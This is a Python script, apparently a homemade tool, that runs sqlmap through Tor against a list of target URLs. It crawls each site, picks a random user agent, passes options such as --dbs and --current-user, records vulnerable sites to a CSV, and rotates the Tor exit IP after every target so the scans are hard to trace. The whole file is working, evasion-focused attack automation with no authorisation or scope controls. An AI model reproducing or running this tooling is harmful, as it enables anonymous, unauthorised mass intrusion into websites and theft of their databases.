#!/usr/bin/env python3

import os
import subprocess
import time
from datetime import datetime

# 🎨 Colors
GREEN = "\033[1;32m"
RED = "\033[1;31m"
YELLOW = "\033[1;33m"
BLUE = "\033[1;34m"
RESET = "\033[0m"

def printc(color, msg):
    print(f"{color}{msg}{RESET}")

def tor_running():
    return subprocess.call(["pgrep", "-x", "tor"], stdout=subprocess.DEVNULL) == 0

def start_tor():
    printc(YELLOW, "[+] Starting Tor service...")
    subprocess.Popen(["tor"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(5)

def wait_for_tor():
    while True:
        try:
            out = subprocess.check_output(["torsocks", "curl", "-s", "https://check.torproject.org/"]).decode()
            if "Congratulations" in out:
                break
        except:
            pass
        printc(YELLOW, "⏳ Waiting for Tor network to become ready...")
        time.sleep(3)

def get_ip(label):
    printc(YELLOW, f"{label} Tor IP: ")
    try:
        ip = subprocess.check_output(["torsocks", "curl", "-s", "https://ifconfig.me"]).decode()
        print(ip.strip())
    except:
        print("Error getting IP")

def run_sqlmap(url, options, log_file):
    cmd = [
        "torsocks", "python3", "sqlmap/sqlmap.py", "-u", url,
        "--crawl=2", "--random-agent", "--timeout=30", "--delay=3",
        "--retries=2", "--batch", f"--output-dir={os.path.expanduser('~')}/.local/share/sqlmap/output"
    ] + options.split()

    try:
        start = time.time()
        output = subprocess.check_output(cmd, stderr=subprocess.STDOUT, text=True)
        duration = time.time() - start
        with open(log_file, "w") as f:
            f.write(output)
        return output, int(duration)
    except subprocess.CalledProcessError as e:
        with open(log_file, "w") as f:
            f.write(e.output)
        return e.output, 0

def rotate_tor():
    subprocess.call(["pkill", "-HUP", "tor"])
    time.sleep(5)

def main():
    os.system("clear")
    printc(GREEN, "🛡️  Advanced SQLMap + Tor Auto Scanner v5.3")

    if not tor_running():
        start_tor()
    else:
        printc(GREEN, "[✓] Tor already running")

    wait_for_tor()

    url_file = input(f"{BLUE}📁 URL list file (one per line): {RESET}")
    url_list = []

    if os.path.isfile(url_file):
        with open(url_file) as f:
            url_list = [line.strip() for line in f if line.strip()]
    else:
        printc(RED, f"[!] File not found: {url_file}")
        single_url = input(f"{BLUE}🌐 Enter a single URL to scan manually: {RESET}").strip()
        if not single_url:
            printc(RED, "[!] No URL entered. Exiting.")
            return
        url_list.append(single_url)

    extra_options = input(f"{BLUE}⚙️  Extra SQLMap options (e.g. --dbs --current-user): {RESET}").strip()

    os.makedirs("logs", exist_ok=True)
    os.makedirs(f"{os.path.expanduser('~')}/tmp", exist_ok=True)
    result_dir = f"{os.path.expanduser('~')}/.local/share/sqlmap/output"
    os.makedirs(result_dir, exist_ok=True)
    csv_path = os.path.join(result_dir, f"results-{datetime.now().strftime('%d%m%Y_%I%M%p')}.csv")
    with open(csv_path, "w") as csv:
        csv.write("Target URL,Place,Parameter,Technique(s),Note(s)\n")

    get_ip("➡️")

    total = len(url_list)
    success = vulnerable = failed = 0

    for count, url in enumerate(url_list, 1):
        printc(YELLOW, f"\n[{count}/{total}] Target: {url}")

        log_name = url.replace("https://", "").replace("http://", "").replace("/", "_").replace("?", "_").replace("&", "_").replace("=", "_")
        log_file = f"logs/{log_name}.log"

        printc(BLUE, "🚀 Running SQLMap...")
        output, duration = run_sqlmap(url, extra_options, log_file)

        if "is vulnerable" in output:
            printc(GREEN, "[✓] Vulnerability Found")
            vulnerable += 1
            success += 1
            row = f"{url},GET,param,BETU,Vulnerable"
        elif "parameter" in output or "testing" in output:
            printc(BLUE, "[✓] Scan Completed")
            success += 1
            row = f"{url},GET,param,?,Clean"
        else:
            printc(RED, "[✗] Scan Failed or Blocked")
            failed += 1
            row = f"{url},?,?,-,Skipped or Failed"

        with open(csv_path, "a") as csv:
            csv.write(f"{row}\n")

        print(f"📝 Log saved: {log_file}")
        get_ip("⬅️")

        printc(BLUE, "🔁 Rotating Tor IP...")
        rotate_tor()

        delay = 10 if duration < 20 else 15
        printc(YELLOW, f"⏱️  Sleeping {delay}s before next scan...")
        time.sleep(delay)
        print("-" * 50)

    # 📊 Summary
    printc(GREEN, "\n✅ All scans complete.")
    print(f"📄 CSV Summary: {csv_path}")
    print(f"\n🔔 {YELLOW}FINAL SUMMARY:{RESET}")
    print(f"🧩 Targets Scanned: {total}")
    printc(GREEN, f"✅ Successful: {success}")
    printc(YELLOW, f"⚠️ Vulnerable: {vulnerable}")
    printc(RED, f"❌ Skipped or Failed: {failed}")
    print(f"📁 Logs saved to: logs/")

if __name__ == "__main__":
    main()
